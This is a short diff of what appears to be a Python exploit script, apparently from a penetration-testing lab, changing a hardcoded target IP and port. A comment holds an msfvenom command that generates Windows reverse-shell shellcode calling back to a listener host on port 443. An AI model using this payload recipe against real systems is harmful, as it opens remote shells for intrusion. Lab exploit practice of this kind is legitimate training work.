@@ -10,8 +10,8 @@
 
 import socket
 
-target_address="10.11.1.125"
-target_port=123
+target_address="10.11.1.x"
+target_port=80
 
 # msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.62 LPORT=443 -b "\x00\x0d" -f python -v shellcode EXITFUNC=thread
 
